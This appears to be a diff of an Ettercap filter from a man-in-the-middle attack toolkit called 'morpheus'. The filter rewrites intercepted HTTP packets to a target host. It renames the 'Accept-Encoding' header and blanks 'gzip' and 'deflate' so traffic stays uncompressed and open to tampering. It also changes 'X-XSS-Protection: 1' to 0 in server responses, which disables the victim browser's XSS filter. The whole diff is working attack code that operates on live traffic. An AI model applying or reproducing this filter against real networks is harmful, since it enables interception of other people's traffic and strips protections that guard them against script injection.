@@ -27,20 +27,33 @@
 ##########################
 ## Zap Content Encoding ##
 ##########################
+# change target request to server
 if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
   msg("[morpheus] host:IpAdDR   [ <- ]  port:80 http ☆");
-    if (search(DATA.data, "gzip")) {
-      replace("gzip", "    "); # note: four spaces In the replacement string
-        msg("[Morpheus] | status: replacing encoding content!");
-        msg("[Morpheus] |  info : packet string gzip zapped ✔");
+    if (search(DATA.data, "Accept-Encoding")) {  
+      replace("Accept-Encoding", "Accept-Rubbish!"); # note: replacement string is same length as original string
+      msg("[Morpheus] | info : Encoding zapped from response ✔");
+    }else{
+    if (search(DECODED.data, "Accept-Encoding")) {  
+      replace("Accept-Encoding", "Accept-Rubbish!"); # note: replacement string is same length as original string
+      msg("[Morpheus] | info : Encoding zapped from response ✔");
     }
+    }
+}
+
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
+  if (search(DATA.data, "gzip")) {
+    replace("gzip", "    "); # note: four spaces In the replacement string
+    msg("[Morpheus] | exec : replacing encoding content!");
+    msg("[Morpheus] | info : packet string gzip zapped ✔");
+  }
 }
 
 if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "deflate")) {
     replace("deflate", "       "); # note: seven spaces In the replacement string
-      msg("[Morpheus] | status: replacing encoding content!");
-      msg("[Morpheus] |  info : packet string deflate zapped ✔");
+    msg("[Morpheus] | exec : replacing encoding content!");
+    msg("[Morpheus] | info : packet string deflate zapped ✔");
   }
 }
 
@@ -50,12 +63,13 @@ if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
 #####################
 ## Replace Content ##
 #####################
+# change server response to target
 if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.src == 80) {
   if search(DATA.data, "X-XSS-Protection: 1")){
     replace("X-XSS-Protection: 1", "X-XSS-Protection: 0");
-      msg("[morpheus] | String: X-XSS-Protection found in header ☆");
-      msg("[Morpheus] | status: replacing xss protection level ✔");
-      msg("[morpheus] |_ info : packet forward back to target host ✔\n");
+    msg("[morpheus] | info : X-XSS-Protection found in header ☆");
+    msg("[Morpheus] | exec : replacing xss protection level ✔");
+    msg("[morpheus] |_info : packet forward back to target host ✔\n");
   }
 }
 
